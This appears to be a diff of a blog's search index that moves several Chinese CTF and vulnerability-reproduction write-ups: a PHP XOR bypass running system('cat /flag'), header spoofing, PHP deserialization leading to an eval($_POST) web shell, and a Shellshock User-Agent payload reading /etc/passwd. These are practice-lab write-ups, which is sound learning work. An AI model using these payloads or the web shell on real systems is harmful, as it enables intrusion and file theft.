class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">1</span>;<span class="variable">$k</span>&lt;=sizeof(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span> = <span class="variable">$payload</span>[<span class="variable">$k</span>] ^ <span class="variable">$i</span>.<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410150225.png" /></p>
-<p>会发现 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">is_nan^64==&gt;_G</span><br><span class="line">tan^15==&gt;ET</span><br></pre></td></tr></table></figure></p>
-<p>因此，最终的payload为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=cat%20/flag</span><br></pre></td></tr></table></figure></p>
-<h1 id="总结">总结</h1>
-<p>这题考察的都是关于PHP的知识（我这不会PHP的太难了）</p>
-<ul>
-<li>各种编码转换绕过</li>
-<li>URL中使用<code>$_GET</code>获取数据</li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>PHP知识</tag>
       </tags>
   </entry>
   <entry>
@@ -2385,30 +2385,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MRCTF2020 PYWebsite</title>
-    <url>/2022/04/13/MRCTF2020%20PYWebsite/</url>
-    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BMRCTF2020%5DPYWebsite">PYWebsite</a></p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境之后，发现页面很复杂。先查看源码，发现</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231227.png" /></p>
-<p>这是后面输入授权码的时候触发的，最开始还以为绕过<code>hex_md5</code>就可以了。在这串代码中还有一个<code>./flag.php</code>。</p>
-<p>访问该文件得到如下界面</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231351.png" /></p>
-<h1 id="解题">解题</h1>
-<p>重点的提示<strong>已经记住了购买者的IP......除了购买者和我自己，没人可以看到flag</strong>。意思就是，要么我们自己购买，要么使用出题者的IP就可以看到flag。前者显然不可能，那么只有后者，这时候想到了一个HTTP头部信息<code>X-Forwarded-For</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231606.png" /></p>
-<p>flag在源码中可以查看</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231627.png" /></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>HTTP</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Jinjia2+Flask模板注入</title>
     <url>/2022/04/05/Jinjia2+Flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<p>记录一下关于Smarty模板注入的知识点以及相关的payload。</p>
@@ -2524,6 +2500,30 @@
       </tags>
   </entry>
   <entry>
+    <title>MRCTF2020 PYWebsite</title>
+    <url>/2022/04/13/MRCTF2020%20PYWebsite/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BMRCTF2020%5DPYWebsite">PYWebsite</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境之后，发现页面很复杂。先查看源码，发现</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231227.png" /></p>
+<p>这是后面输入授权码的时候触发的，最开始还以为绕过<code>hex_md5</code>就可以了。在这串代码中还有一个<code>./flag.php</code>。</p>
+<p>访问该文件得到如下界面</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231351.png" /></p>
+<h1 id="解题">解题</h1>
+<p>重点的提示<strong>已经记住了购买者的IP......除了购买者和我自己，没人可以看到flag</strong>。意思就是，要么我们自己购买，要么使用出题者的IP就可以看到flag。前者显然不可能，那么只有后者，这时候想到了一个HTTP头部信息<code>X-Forwarded-For</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231606.png" /></p>
+<p>flag在源码中可以查看</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231627.png" /></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>HTTP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>NCTF2019 Fake XML cookbook</title>
     <url>/2022/04/08/NCTF2019%20Fake%20XML%20cookbook/</url>
     <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BNCTF2019%5DFake%20XML%20cookbook">NCTF2019 Fake XML cookbook</a></p>
@@ -2551,6 +2551,41 @@
       </categories>
       <tags>
         <tag>XXE漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NPUCTF2020 ReadlezPHP</title>
+    <url>/2022/04/16/NPUCTF2020%20ReadlezPHP/</url>
+    <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5BNPUCTF2020%5DReadlezPHP">ReadlezPHP</a></p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境，得到如下信息</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416090154.png" /></p>
+<p>没有什么有用的，查看一下源码，发现了</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416090217.png" /></p>
+<p>直接访问该文件，得到源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]); </span><br></pre></td></tr></table></figure></p>
+<h1 id="解题">解题</h1>
+<p>本题考的比较的简单，就是单纯的反序列化，编写如下代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$p</span>);</span><br></pre></td></tr></table></figure></p>
+<p>将得到的字符串用GET方式提交给data参数。按道理来说，此时就会执行相应的命令，但奇怪的是网页返回了时间，而没返回执行<code>system('id')</code>得到的结果。把<code>system</code>用其他执行系统命令的函数替代，发现都不行。估计被过滤了吧。</p>
+<p>又尝试了执行PHP代码的函数，如<code>eval()</code>、<code>assert()</code>等，发现当执行到<code>assert(phpinfo())</code>的时候，页面显示了对应的信息。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416090906.png" /></p>
+<p>并且发现直接执行<code>eval(phpinfo())</code>页面没有显示，而<code>assert(eval(phpinfo()))</code>时，页面显示了内容。因此，尝试写入一句话，然后蚁剑连接 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">assert(<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>]))</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416091327.png" /></p>
+<p>但是发现什么信息都没有！因此又回到phpinfo()界面搜索了一下<code>flag</code>，居然还真藏在这里！</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220416091517.png" /></p>
+<h1 id="总结">总结</h1>
+<p>我认为这道题只要学会了一下两个知识点即可：</p>
+<ul>
+<li>反序列化；</li>
+<li>通过这种方式上线蚁剑；</li>
+</ul>
+<p>flag的位置着实令人想不到。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>PHP反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -3265,35 +3300,6 @@
       </tags>
   </entry>
   <entry>
-    <title>windows 上CD驱动器的删除问题</title>
-    <url>/2022/03/28/windows%20%E4%B8%8ACD%E9%A9%B1%E5%8A%A8%E5%99%A8%E7%9A%84%E5%88%A0%E9%99%A4%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>记录个人日常生活中遇到的繁琐的小问题的解决。</p>
-<span id="more"></span>
-<h1 id="问题描述">问题描述</h1>
-<p>有时候，电脑上总会莫名其妙的安装了如下 CD驱动器：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224202.png" /></p>
-<p>删除也删不掉，打开也打开不了，很烦。</p>
-<h1 id="原因">原因</h1>
-<p>CD驱动器计算机-设备和驱动器分类下的计算机光驱管理，可加载ISO文件，多在计算机安装<code>UltraISO</code>软碟通等虚拟光驱软件后自动在我的电脑下创建CD驱动器图标。</p>
-<p>知道原因后，解决的办法就很简单了。</p>
-<h1 id="问题解决">问题解决</h1>
-<p>首先，以管理员方式打开 <code>UltraISO</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224452.png" /></p>
-<p><code>选项 -&gt; 配置</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224557.png" /></p>
-<p>然后 <code>虚拟光驱</code>，<strong>将设备数量改为无</strong></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224629.png" /></p>
-<p>然后即可看到 CD驱动器已经消失了。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224711.png" /></p>
-]]></content>
-      <categories>
-        <category>Windows</category>
-      </categories>
-      <tags>
-        <tag>Windows小知识</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>python challenge 题解</title>
     <url>/2022/01/29/python%20challenge%20%E9%A2%98%E8%A7%A3/</url>
     <content><![CDATA[<p>这是个人的 python challenge 的刷题记录，网址是：<a href="http://www.pythonchallenge.com/">python challenge</a>。更多内容请点击 <strong>阅读全文</strong>，如有错误，欢迎在评论区指出。</p>
@@ -3619,6 +3625,35 @@
       </tags>
   </entry>
   <entry>
+    <title>windows 上CD驱动器的删除问题</title>
+    <url>/2022/03/28/windows%20%E4%B8%8ACD%E9%A9%B1%E5%8A%A8%E5%99%A8%E7%9A%84%E5%88%A0%E9%99%A4%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>记录个人日常生活中遇到的繁琐的小问题的解决。</p>
+<span id="more"></span>
+<h1 id="问题描述">问题描述</h1>
+<p>有时候，电脑上总会莫名其妙的安装了如下 CD驱动器：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224202.png" /></p>
+<p>删除也删不掉，打开也打开不了，很烦。</p>
+<h1 id="原因">原因</h1>
+<p>CD驱动器计算机-设备和驱动器分类下的计算机光驱管理，可加载ISO文件，多在计算机安装<code>UltraISO</code>软碟通等虚拟光驱软件后自动在我的电脑下创建CD驱动器图标。</p>
+<p>知道原因后，解决的办法就很简单了。</p>
+<h1 id="问题解决">问题解决</h1>
+<p>首先，以管理员方式打开 <code>UltraISO</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224452.png" /></p>
+<p><code>选项 -&gt; 配置</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224557.png" /></p>
+<p>然后 <code>虚拟光驱</code>，<strong>将设备数量改为无</strong></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224629.png" /></p>
+<p>然后即可看到 CD驱动器已经消失了。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220328224711.png" /></p>
+]]></content>
+      <categories>
+        <category>Windows</category>
+      </categories>
+      <tags>
+        <tag>Windows小知识</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>反序列化知识点</title>
     <url>/2022/04/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
     <content><![CDATA[<p>个人总结的知识点，持续更新。</p>
@@ -3874,6 +3909,34 @@
       </tags>
   </entry>
   <entry>
+    <title>复现：Bash Shellshock 破壳漏洞（CVE-2014-6271）</title>
+    <url>/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/</url>
+    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
+<span id="more"></span>
+<h1 id="漏洞信息">漏洞信息</h1>
+<p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在<strong>输入的过滤中没有严格限制边界，也没有做出合法化的参数判断</strong>。</p>
+<p>参考链接： - https://github.com/vulhub/vulhub/blob/master/bash/CVE-2014-6271/README.zh-cn.md</p>
+<p>影响版本： - bash version &lt;= 4.3</p>
+<p>路径： - <code>vulhub-master/bash/shellshock</code></p>
+<p>启动环境： - <code>sudo docker-compose up -d</code> - 输入 <code>http://ip:8080</code> 即可访问</p>
+<h1 id="复现">复现</h1>
+<p>服务启动后，有两个页面<code>http://your-ip:8080/victim.cgi</code>和<code>http://your-ip:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p>
+<p>直接访问<code>http://192.168.100.16:8080/victim.cgi</code>，得到如下界面</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203007.png" /></p>
+<p>此时，往HTTP头部的<code>User-Agent</code>写入如下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; /bin/cat /etc/passwd</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203313.png" /></p>
+<p>同样的，对<code>safe.cgi</code>做一样的过程，发现没有任何事发生</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203401.png" /></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>破壳漏洞</tag>
+        <tag>shellshock</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>安洵杯 2019 easy_serialize_php</title>
     <url>/2022/04/09/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%20easy_serialize_php/</url>
     <content><![CDATA[<p>题目地址：<a href="https://buuoj.cn/challenges#%5B安洵杯%202019%5Deasy_serialize_php">easy_serialize_php</a></p>
@@ -3923,34 +3986,6 @@
       <tags>
         <tag>反序列化字符串逃逸</tag>
         <tag>PHP变量覆盖</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>复现：Bash Shellshock 破壳漏洞（CVE-2014-6271）</title>
-    <url>/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/</url>
-    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
-<span id="more"></span>
-<h1 id="漏洞信息">漏洞信息</h1>
-<p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在<strong>输入的过滤中没有严格限制边界，也没有做出合法化的参数判断</strong>。</p>
-<p>参考链接： - https://github.com/vulhub/vulhub/blob/master/bash/CVE-2014-6271/README.zh-cn.md</p>
-<p>影响版本： - bash version &lt;= 4.3</p>
-<p>路径： - <code>vulhub-master/bash/shellshock</code></p>
-<p>启动环境： - <code>sudo docker-compose up -d</code> - 输入 <code>http://ip:8080</code> 即可访问</p>
-<h1 id="复现">复现</h1>
-<p>服务启动后，有两个页面<code>http://your-ip:8080/victim.cgi</code>和<code>http://your-ip:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p>
-<p>直接访问<code>http://192.168.100.16:8080/victim.cgi</code>，得到如下界面</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203007.png" /></p>
-<p>此时，往HTTP头部的<code>User-Agent</code>写入如下命令： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; /bin/cat /etc/passwd</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203313.png" /></p>
-<p>同样的，对<code>safe.cgi</code>做一样的过程，发现没有任何事发生</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412203401.png" /></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>破壳漏洞</tag>
-        <tag>shellshock</tag>
       </tags>
   </entry>
   <entry>
